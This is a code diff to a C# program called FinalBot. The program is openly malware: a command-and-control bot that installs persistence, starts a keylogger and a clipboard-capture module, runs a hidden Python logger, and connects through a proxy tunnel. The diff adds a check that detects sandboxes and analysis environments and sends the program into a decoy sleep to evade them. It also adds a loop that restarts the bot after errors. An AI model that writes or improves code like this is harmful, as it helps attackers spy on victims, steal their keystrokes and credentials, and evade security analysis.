@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using VanguardCore;
 using VanguardCore.Modules;
+using VanguardCore.Defense;
 using FinalBot.Modules;
 
 namespace FinalBot
@@ -35,6 +36,14 @@ namespace FinalBot
                 DebugLog($"UNOBSERVED TASK ERROR: {e.Exception}");
                 e.SetObserved();
             };
+
+            // [STEP 0] Advanced Anti-Sandbox Check
+            if (AntiAnalysis.CheckAll())
+            {
+                DebugLog("SANDBOX DETECTED. ENTERING DECOY SLEEP MODE.");
+                AntiAnalysis.EnterSleepMode(); // Infinite loop
+                return;
+            }
 
             // [V6.12] Initialize Crypto Keys first for reliable Vault access
             SafetyManager.StartupKeys();
@@ -150,27 +159,37 @@ namespace FinalBot
 
             Persistence.Install();
 
-            try 
+            // --- Resilience Loop ---
+            while (true)
             {
-                ConfigManager.Load();
-                string token = ConfigManager.Get("BOT_TOKEN");
-                string adminId = ConfigManager.Get("ADMIN_ID");
-                var httpClient = await ProxyTunnel.GetBestHttpClient();
-                var orchestrator = new BotOrchestrator(token, adminId, httpClient);
-                
-                KeyloggerModule.Start(); 
-                ClipboardModule.Start(); 
-                
-                _ = Task.Run(() => {
-                    try {
-                        string lp = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
-                        if (File.Exists(lp)) Process.Start(new ProcessStartInfo { FileName = "python", Arguments = $"\"{lp}\"", CreateNoWindow = true });
-                    } catch { }
-                });
+                try 
+                {
+                    DebugLog("Initializing core services...");
+                    ConfigManager.Load();
+                    string token = ConfigManager.Get("BOT_TOKEN");
+                    string adminId = ConfigManager.Get("ADMIN_ID");
+                    var httpClient = await ProxyTunnel.GetBestHttpClient();
+                    var orchestrator = new BotOrchestrator(token, adminId, httpClient);
+                    
+                    KeyloggerModule.Start(); 
+                    ClipboardModule.Start(); 
+                    
+                    _ = Task.Run(() => {
+                        try {
+                            string lp = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
+                            if (File.Exists(lp)) Process.Start(new ProcessStartInfo { FileName = "python", Arguments = $"\"{lp}\"", CreateNoWindow = true });
+                        } catch { }
+                    });
 
-                await orchestrator.StartAsync();
+                    DebugLog("C2 Orchestrator Starting...");
+                    await orchestrator.StartAsync();
+                }
+                catch (Exception ex) 
+                { 
+                    DebugLog($"RESILIENCE ERROR: {ex.Message}. Restarting in 60s...");
+                    await Task.Delay(60000); // Backoff before restart
+                }
             }
-            catch (Exception ex) { DebugLog($"FATAL: {ex.Message}"); }
         }
 
         private static string GetStableMutexName()
